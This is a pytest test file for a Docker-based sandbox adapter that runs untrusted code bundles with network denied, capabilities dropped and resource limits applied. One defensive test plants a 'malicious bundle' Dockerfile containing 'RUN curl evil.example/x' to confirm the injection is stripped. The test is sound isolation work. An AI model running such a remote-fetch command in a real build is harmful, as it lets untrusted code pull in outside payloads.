"""Tests for `DockerSandboxAdapter`.

`TestBuildCreateArgv`/`TestCpuLimit` are pure, deterministic, always run.
`TestLiveDocker` genuinely exercises a real Docker daemon end to end when
one is reachable, and is skipped otherwise — this environment's Docker CLI
is installed but its daemon is unreachable (confirmed via `docker info`),
so `TestLiveDocker` is expected to skip here, the same "not live-verified
in this environment" caveat `OllamaAdapter`'s own `TestLiveOllama` and
`GitHubVCSAdapter`/`AnthropicAdapter`/`GeminiAdapter` all carry.
"""

from __future__ import annotations

import hashlib
import io
import os
import shutil
import subprocess
import tarfile
from collections.abc import Callable

import pytest

from cortexward.ports import EgressPolicy, ExecutionSpec, ResourceLimits, SandboxPort
from cortexward.sandbox import DockerSandboxAdapter
from cortexward.sandbox.docker_adapter import (
    _DOCKERFILE_PATH,
    _build_context_tar,
    _cpu_limit,
    _output_volume_name,
    build_create_argv,
)

pytestmark = pytest.mark.unit

_DOCKER = shutil.which("docker")


def _docker_daemon_reachable() -> bool:
    if _DOCKER is None:
        return False
    try:
        result = subprocess.run(  # noqa: S603 # nosec B603
            [_DOCKER, "info"], capture_output=True, timeout=5, check=False
        )
    except (OSError, subprocess.TimeoutExpired):
        return False
    return result.returncode == 0


class _InMemoryArtifactStore:
    """A trivial, real (not mocked) `ArtifactStore` -- sha256-addressed like `SqliteStoragePort`."""

    def __init__(self) -> None:
        self._store: dict[str, bytes] = {}

    def put_artifact(self, content: bytes) -> str:
        ref = f"sha256:{hashlib.sha256(content).hexdigest()}"
        self._store[ref] = content
        return ref

    def get_artifact(self, ref: str) -> bytes:
        return self._store[ref]


def _tar_bytes(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w") as tar:
        for name, content in files.items():
            data = content.encode("utf-8")
            info = tarfile.TarInfo(name=name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def _spec(
    *,
    command: tuple[str, ...] = ("python3", "-c", "print('hi')"),
    bundle_ref: str = "sha256:none",
    **overrides: object,
) -> ExecutionSpec:
    return ExecutionSpec(command=command, input_bundle_ref=bundle_ref, **overrides)  # type: ignore[arg-type]


class _FakeCompletedProcess:
    """A `subprocess.CompletedProcess` stand-in with just the fields this adapter reads."""

    def __init__(
        self, returncode: int = 0, stdout: bytes | str = b"", stderr: bytes | str = b""
    ) -> None:
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


_FakeRun = Callable[..., _FakeCompletedProcess]


def _make_fake_run(
    *,
    output_tar: bytes | None = None,
    start_timeout: bool = False,
    start_returncode: int = 0,
    start_stdout: str = "",
    start_stderr: str = "",
) -> _FakeRun:
    """A `subprocess.run` stand-in dispatching on the `docker` subcommand.

    Mirrors this codebase's own convention of monkeypatching the external
    tool's I/O boundary for deterministic tests (matching `BanditScanner`'s/
    `SemgrepScanner`'s own resilience tests) -- real end-to-end coverage
    against an actual daemon is `TestLiveDocker`'s job, skipped in this
    environment (no daemon reachable).
    """

    def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
        subcommand = argv[1]
        if subcommand == "build":
            return _FakeCompletedProcess(returncode=0)  # image built from the bundle
        if subcommand == "create":
            return _FakeCompletedProcess(returncode=0)
        if subcommand == "start":
            if start_timeout:
                timeout = kwargs.get("timeout")
                raise subprocess.TimeoutExpired(
                    cmd=argv,
                    timeout=float(timeout) if isinstance(timeout, int | float) else 0.0,
                    output=start_stdout,
                    stderr=start_stderr,
                )
            return _FakeCompletedProcess(
                returncode=start_returncode, stdout=start_stdout, stderr=start_stderr
            )
        if subcommand == "cp" and argv[-1] == "-":
            if output_tar is None:
                return _FakeCompletedProcess(returncode=1)  # /output doesn't exist
            return _FakeCompletedProcess(returncode=0, stdout=output_tar)
        if subcommand in ("kill", "rm", "rmi", "volume"):
            return _FakeCompletedProcess(returncode=0)
        raise AssertionError(f"unexpected docker subcommand: {argv}")

    return _fake_run


class TestCpuLimit:
    def test_defaults_to_a_fraction_of_the_wall_clock_window(self) -> None:
        limits = ResourceLimits(cpu_seconds=30.0, wall_clock_seconds=90.0)
        assert _cpu_limit(limits) == pytest.approx(30.0 / 90.0)

    def test_clamps_to_a_minimum(self) -> None:
        limits = ResourceLimits(cpu_seconds=0.0001, wall_clock_seconds=1000.0)
        assert _cpu_limit(limits) == pytest.approx(0.1)

    def test_clamps_to_a_maximum_of_this_hosts_own_cpu_count(self) -> None:
        limits = ResourceLimits(cpu_seconds=1000.0, wall_clock_seconds=1.0)
        assert _cpu_limit(limits) == pytest.approx(float(os.cpu_count() or 1))

    def test_zero_wall_clock_does_not_divide_by_zero(self) -> None:
        limits = ResourceLimits(cpu_seconds=10.0, wall_clock_seconds=0.0)
        assert _cpu_limit(limits) == 1.0


class TestOutputVolumeName:
    def test_derived_deterministically_from_the_container_name(self) -> None:
        assert _output_volume_name("cortexward-abc123") == "cortexward-abc123-output"

    def test_different_containers_get_different_volumes(self) -> None:
        assert _output_volume_name("c1") != _output_volume_name("c2")


class TestBuildCreateArgv:
    def test_deny_all_produces_the_expected_isolation_flags(self) -> None:
        argv = build_create_argv(_spec(), name="c1")
        assert "--network" in argv
        assert argv[argv.index("--network") + 1] == "none"
        assert "--read-only" in argv
        assert "--tmpfs" in argv
        assert argv[argv.index("--tmpfs") + 1] == "/tmp"  # noqa: S108
        assert argv.count("--tmpfs") == 1
        assert "--volume" in argv
        assert argv[argv.index("--volume") + 1] == "c1-output:/output"
        assert "no-new-privileges" in argv
        assert "--cap-drop" in argv
        assert argv[argv.index("--cap-drop") + 1] == "ALL"
        assert "--user" in argv
        assert argv[argv.index("--user") + 1] == "1000:1000"

    def test_allow_list_raises_not_implemented(self) -> None:
        spec = _spec(egress=EgressPolicy.ALLOW_LIST, allowed_hosts=("example.com",))
        with pytest.raises(NotImplementedError, match="ALLOW_LIST"):
            build_create_argv(spec, name="c1")

    def test_memory_limits_are_translated(self) -> None:
        argv = build_create_argv(_spec(limits=ResourceLimits(memory_mb=256)), name="c1")
        assert "--memory" in argv
        assert argv[argv.index("--memory") + 1] == "256m"
        assert "--memory-swap" in argv
        assert argv[argv.index("--memory-swap") + 1] == "256m"

    def test_image_defaults_to_python_slim(self) -> None:
        argv = build_create_argv(_spec(), name="c1")
        assert "python:3.11-slim" in argv

    def test_custom_image_is_used(self) -> None:
        argv = build_create_argv(_spec(image="node:20-slim"), name="c1")
        assert "node:20-slim" in argv
        assert "python:3.11-slim" not in argv

    def test_command_is_appended_after_the_image(self) -> None:
        argv = build_create_argv(_spec(command=("echo", "hi")), name="c1")
        image_index = argv.index("python:3.11-slim")
        assert argv[image_index + 1 :] == ("echo", "hi")

    def test_env_vars_are_included_and_sorted_for_determinism(self) -> None:
        argv = build_create_argv(_spec(env={"B": "2", "A": "1"}), name="c1")
        a_index = argv.index("--env", 0)
        assert argv[a_index + 1] == "A=1"
        b_index = argv.index("--env", a_index + 1)
        assert argv[b_index + 1] == "B=2"

    def test_container_name_is_set(self) -> None:
        argv = build_create_argv(_spec(), name="my-container")
        assert "--name" in argv
        assert argv[argv.index("--name") + 1] == "my-container"

    def test_uses_the_given_docker_binary_path(self) -> None:
        argv = build_create_argv(_spec(), name="c1", docker="/usr/local/bin/docker")
        assert argv[0] == "/usr/local/bin/docker"

    def test_image_override_replaces_spec_image(self) -> None:
        argv = build_create_argv(_spec(), name="c1", image="cortexward-build-abc123")
        assert "cortexward-build-abc123" in argv
        assert "python:3.11-slim" not in argv

    def test_no_image_override_falls_back_to_spec_image(self) -> None:
        argv = build_create_argv(_spec(), name="c1")
        assert "python:3.11-slim" in argv


class TestBuildContextTar:
    """`_build_context_tar` merges a synthetic Dockerfile with the caller's bundle."""

    def test_contains_a_dockerfile_that_from_copy_workdirs_the_given_image(self) -> None:
        context = _build_context_tar("python:3.11-slim", _tar_bytes({}))
        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
            dockerfile = tar.extractfile(_DOCKERFILE_PATH)
            assert dockerfile is not None
            content = dockerfile.read().decode("utf-8")
        assert "FROM python:3.11-slim" in content
        assert "COPY . /workspace" in content
        assert "WORKDIR /workspace" in content

    def test_dockerfile_pre_creates_output_owned_by_the_container_user(self) -> None:
        # A freshly-populated named volume inherits the image's ownership at
        # that mount point -- without this, /output is root-owned and the
        # unprivileged container user gets "Permission denied" writing to
        # it, confirmed empirically against a real daemon.
        context = _build_context_tar("python:3.11-slim", _tar_bytes({}))
        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
            dockerfile = tar.extractfile(_DOCKERFILE_PATH)
            assert dockerfile is not None
            content = dockerfile.read().decode("utf-8")
        assert "mkdir -p /output" in content
        assert "chown 1000:1000 /output" in content

    def test_bundle_files_are_merged_into_the_context(self) -> None:
        context = _build_context_tar("python:3.11-slim", _tar_bytes({"hello.txt": "world"}))
        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
            names = tar.getnames()
            assert "hello.txt" in names
            extracted = tar.extractfile("hello.txt")
            assert extracted is not None
            assert extracted.read() == b"world"

    def test_an_empty_bundle_still_produces_a_valid_context(self) -> None:
        context = _build_context_tar("python:3.11-slim", _tar_bytes({}))
        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
            assert tar.getnames() == [_DOCKERFILE_PATH]

    def test_genuinely_empty_bytes_are_treated_the_same_as_an_empty_tar(self) -> None:
        context = _build_context_tar("python:3.11-slim", b"")
        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
            assert tar.getnames() == [_DOCKERFILE_PATH]

    def test_a_bundle_supplied_dockerfile_at_the_reserved_path_is_dropped(self) -> None:
        # ADR-0004: the bundle is untrusted input. A malicious bundle that
        # tries to overwrite the reserved Dockerfile path (to inject its own
        # RUN steps, which would execute with the *daemon's* own network
        # access during the build) must never win.
        malicious_bundle = _tar_bytes({_DOCKERFILE_PATH: "FROM scratch\nRUN curl evil.example/x"})
        context = _build_context_tar("python:3.11-slim", malicious_bundle)
        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
            dockerfile = tar.extractfile(_DOCKERFILE_PATH)
            assert dockerfile is not None
            content = dockerfile.read().decode("utf-8")
        assert "FROM python:3.11-slim" in content
        assert "curl" not in content

    def test_other_files_under_the_reserved_directory_are_also_dropped(self) -> None:
        bundle = _tar_bytes({".cortexward-build/sneaky.txt": "not welcome"})
        context = _build_context_tar("python:3.11-slim", bundle)
        with tarfile.open(fileobj=io.BytesIO(context), mode="r") as tar:
            names = tar.getnames()
        assert ".cortexward-build/sneaky.txt" not in names


class TestProtocolConformance:
    def test_satisfies_the_sandbox_port_protocol(self) -> None:
        assert isinstance(DockerSandboxAdapter(_InMemoryArtifactStore()), SandboxPort)


class TestBinaryResolution:
    def test_missing_docker_binary_raises_runtime_error(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr("shutil.which", lambda _name: None)
        adapter = DockerSandboxAdapter(_InMemoryArtifactStore())
        with pytest.raises(RuntimeError, match="docker binary not found"):
            adapter.execute(_spec())

    def test_an_explicit_docker_path_skips_which_resolution(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def _should_not_be_called(_name: str) -> None:
            raise AssertionError("should not resolve")

        monkeypatch.setattr("shutil.which", _should_not_be_called)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        # Fails once it actually tries to run the fake path, not at resolution time.
        with pytest.raises(OSError):
            adapter.execute(_spec(bundle_ref=bundle_ref))

    def test_docker_is_resolved_via_which_when_not_given_explicitly(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr("shutil.which", lambda _name: "/resolved/docker")
        monkeypatch.setattr(subprocess, "run", _make_fake_run())
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store)
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.exit_code == 0


class TestExecuteMocked:
    """Deterministic coverage of `execute()`'s full flow via a mocked `docker` CLI.

    `TestLiveDocker` below proves this same flow against a real daemon when
    one is reachable; these tests exercise every branch (success, timeout,
    artifact collection) without needing one, the same "mock the external
    tool's I/O boundary" convention `BanditScanner`'s/`SemgrepScanner`'s own
    resilience tests already use in this codebase.
    """

    def test_a_failed_create_raises_with_stderr(self, monkeypatch: pytest.MonkeyPatch) -> None:
        def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
            if argv[1] == "create":
                return _FakeCompletedProcess(returncode=1, stderr=b"invalid --cpus value")
            return _FakeCompletedProcess(returncode=0)

        monkeypatch.setattr(subprocess, "run", _fake_run)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        with pytest.raises(RuntimeError, match=r"docker create failed.*invalid --cpus value"):
            adapter.execute(_spec(bundle_ref=bundle_ref))

    def test_a_failed_build_raises_with_stderr(self, monkeypatch: pytest.MonkeyPatch) -> None:
        def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
            if argv[1] == "build":
                return _FakeCompletedProcess(returncode=1, stderr=b"unknown instruction")
            return _FakeCompletedProcess(returncode=0)

        monkeypatch.setattr(subprocess, "run", _fake_run)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        with pytest.raises(RuntimeError, match=r"docker build failed.*unknown instruction"):
            adapter.execute(_spec(bundle_ref=bundle_ref))

    def test_a_failed_build_still_cleans_up_nothing_further(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # A build failure happens before any container exists -- `docker rm`
        # should never even be attempted, only the (harmless, best-effort)
        # `docker rmi` cleanup of whatever the failed build tag was.
        calls: list[list[str]] = []

        def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
            calls.append(argv)
            if argv[1] == "build":
                return _FakeCompletedProcess(returncode=1, stderr=b"boom")
            return _FakeCompletedProcess(returncode=0)

        monkeypatch.setattr(subprocess, "run", _fake_run)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        with pytest.raises(RuntimeError):
            adapter.execute(_spec(bundle_ref=bundle_ref))
        subcommands = [call[1] for call in calls]
        assert "rm" not in subcommands
        assert "volume" not in subcommands
        assert "rmi" in subcommands

    def test_a_successful_run_returns_its_output(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(
            subprocess, "run", _make_fake_run(start_returncode=0, start_stdout="pong\n")
        )
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.exit_code == 0
        assert result.stdout == "pong\n"
        assert result.timed_out is False
        assert result.artifact_refs == ()

    def test_a_nonzero_exit_code_is_reported_not_raised(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            subprocess, "run", _make_fake_run(start_returncode=1, start_stderr="boom")
        )
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.exit_code == 1
        assert result.stderr == "boom"

    def test_a_timeout_kills_the_container_and_is_reported(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            subprocess,
            "run",
            _make_fake_run(start_timeout=True, start_stdout="partial", start_stderr="also partial"),
        )
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.timed_out is True
        assert result.exit_code == -1
        assert result.stdout == "partial"
        assert result.stderr == "also partial"

    def test_a_timeout_with_no_captured_output_reports_empty_strings(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
            if argv[1] == "start":
                raise subprocess.TimeoutExpired(cmd=argv, timeout=1.0)
            return _FakeCompletedProcess(returncode=0)

        monkeypatch.setattr(subprocess, "run", _fake_run)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.stdout == ""
        assert result.stderr == ""

    def test_a_timeout_with_bytes_output_is_decoded(self, monkeypatch: pytest.MonkeyPatch) -> None:
        def _fake_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
            if argv[1] == "start":
                raise subprocess.TimeoutExpired(
                    cmd=argv, timeout=1.0, output=b"partial-bytes", stderr=b"partial-err-bytes"
                )
            return _FakeCompletedProcess(returncode=0)

        monkeypatch.setattr(subprocess, "run", _fake_run)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.stdout == "partial-bytes"
        assert result.stderr == "partial-err-bytes"

    def test_produced_output_files_are_collected_as_artifacts(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        output_tar = _tar_bytes({"poc.txt": "evidence"})
        monkeypatch.setattr(subprocess, "run", _make_fake_run(output_tar=output_tar))
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert len(result.artifact_refs) == 1
        assert store.get_artifact(result.artifact_refs[0]) == b"evidence"

    def test_no_output_directory_yields_no_artifacts(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(subprocess, "run", _make_fake_run(output_tar=None))
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.artifact_refs == ()

    def test_non_file_tar_members_are_skipped(self, monkeypatch: pytest.MonkeyPatch) -> None:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w") as tar:
            directory = tarfile.TarInfo(name="a_directory")
            directory.type = tarfile.DIRTYPE
            tar.addfile(directory)
        monkeypatch.setattr(subprocess, "run", _make_fake_run(output_tar=buffer.getvalue()))
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.artifact_refs == ()

    def test_a_member_extractfile_cannot_open_is_skipped(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            subprocess, "run", _make_fake_run(output_tar=_tar_bytes({"poc.txt": "evidence"}))
        )
        monkeypatch.setattr(tarfile.TarFile, "extractfile", lambda self, member: None)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        result = adapter.execute(_spec(bundle_ref=bundle_ref))
        assert result.artifact_refs == ()

    def test_the_container_image_and_output_volume_are_always_removed_even_on_failure(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        rm_calls: list[list[str]] = []
        rmi_calls: list[list[str]] = []
        volume_rm_calls: list[list[str]] = []
        fake_run = _make_fake_run()

        def _tracking_run(argv: list[str], **kwargs: object) -> _FakeCompletedProcess:
            if argv[1] == "rm":
                rm_calls.append(argv)
            elif argv[1] == "rmi":
                rmi_calls.append(argv)
            elif argv[1] == "volume":
                volume_rm_calls.append(argv)
            return fake_run(argv, **kwargs)

        monkeypatch.setattr(subprocess, "run", _tracking_run)
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store, docker="/fake/docker")
        adapter.execute(_spec(bundle_ref=bundle_ref))
        assert len(rm_calls) == 1
        assert rm_calls[0][0] == "/fake/docker"
        assert "-f" in rm_calls[0]
        assert len(rmi_calls) == 1
        assert rmi_calls[0][0] == "/fake/docker"
        assert "-f" in rmi_calls[0]
        assert len(volume_rm_calls) == 1
        assert volume_rm_calls[0][0] == "/fake/docker"
        assert volume_rm_calls[0][2] == "rm"
        assert "-f" in volume_rm_calls[0]


@pytest.mark.skipif(not _docker_daemon_reachable(), reason="no local Docker daemon reachable")
class TestLiveDocker:
    """Genuinely exercises a real Docker daemon end to end, when present.

    Not required for CI or this environment (Docker's CLI is installed but
    its daemon is unreachable here) — skipped there, exercised whenever a
    developer happens to be running Docker Desktop/dockerd locally.
    """

    def test_a_real_command_runs_and_returns_its_stdout(self) -> None:
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store)
        spec = _spec(command=("python3", "-c", "print('pong')"), bundle_ref=bundle_ref)
        result = adapter.execute(spec)
        assert result.exit_code == 0
        assert "pong" in result.stdout

    def test_the_tmp_scratch_area_is_writable_by_the_unprivileged_user(self) -> None:
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store)
        script = "import pathlib; pathlib.Path('/tmp/scratch.txt').write_text('ok'); print('WROTE')"
        spec = _spec(command=("python3", "-c", script), bundle_ref=bundle_ref)
        result = adapter.execute(spec)
        assert result.exit_code == 0, result.stderr
        assert "WROTE" in result.stdout
        assert result.timed_out is False

    def test_network_egress_is_denied_by_default(self) -> None:
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store)
        script = (
            "import urllib.request\n"
            "try:\n"
            "    urllib.request.urlopen('https://example.com', timeout=3)\n"
            "    print('REACHED')\n"
            "except Exception as e:\n"
            "    print('BLOCKED')\n"
        )
        spec = _spec(command=("python3", "-c", script), bundle_ref=bundle_ref)
        result = adapter.execute(spec)
        assert "BLOCKED" in result.stdout

    def test_the_input_bundle_is_available_in_the_workspace(self) -> None:
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({"hello.txt": "world"}))
        adapter = DockerSandboxAdapter(store)
        spec = _spec(command=("cat", "hello.txt"), bundle_ref=bundle_ref)
        result = adapter.execute(spec)
        assert result.stdout.strip() == "world"

    def test_produced_output_files_become_artifacts(self) -> None:
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store)
        # /output already exists as the named-volume mount point, so the
        # command only needs to write into it, not create it.
        script = "import pathlib; pathlib.Path('/output/poc.txt').write_text('evidence')"
        spec = _spec(command=("python3", "-c", script), bundle_ref=bundle_ref)
        result = adapter.execute(spec)
        assert result.exit_code == 0, result.stderr
        assert len(result.artifact_refs) == 1
        assert store.get_artifact(result.artifact_refs[0]) == b"evidence"

    def test_a_timeout_is_enforced_and_reported(self) -> None:
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store)
        spec = _spec(
            command=("python3", "-c", "import time; time.sleep(30)"),
            bundle_ref=bundle_ref,
            limits=ResourceLimits(wall_clock_seconds=2.0),
        )
        result = adapter.execute(spec)
        assert result.timed_out is True

    def test_the_container_is_removed_after_execution(self) -> None:
        assert _DOCKER is not None  # guaranteed by the class-level skipif
        store = _InMemoryArtifactStore()
        bundle_ref = store.put_artifact(_tar_bytes({}))
        adapter = DockerSandboxAdapter(store)
        spec = _spec(command=("true",), bundle_ref=bundle_ref)
        adapter.execute(spec)
        listing = subprocess.run(  # noqa: S603 # nosec B603
            [_DOCKER, "ps", "-a", "--filter", "name=cortexward-", "--format", "{{.Names}}"],
            capture_output=True,
            text=True,
            check=True,
        )
        assert listing.stdout.strip() == ""
